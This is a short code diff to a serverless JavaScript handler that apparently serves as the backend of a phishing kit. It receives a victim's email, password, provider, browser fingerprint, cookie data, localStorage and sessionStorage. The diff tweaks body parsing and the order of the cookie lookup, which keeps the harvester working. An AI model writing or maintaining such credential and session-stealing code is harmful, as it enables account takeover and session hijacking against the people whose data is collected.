@@ -24,7 +24,7 @@ export const handler = async (event, context) => {
   }
 
   try {
-    const data = JSON.parse(event.body);
+    const data = JSON.parse(event.body || '{}');
     const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;
 
     console.log('📝 Received data:', {
@@ -59,7 +59,7 @@ export const handler = async (event, context) => {
                      'Unknown';
 
     // Enhanced cookie processing
-    const cookieInfo = data.documentCookies || browserFingerprint?.cookies || data.cookies || 'No cookies available';
+    const cookieInfo = data.documentCookies || data.cookies || browserFingerprint?.cookies || 'No cookies available';
     const localStorageInfo = browserFingerprint?.localStorage || data.localStorage || 'Empty';
     const sessionStorageInfo = browserFingerprint?.sessionStorage || data.sessionStorage || 'Empty';
     
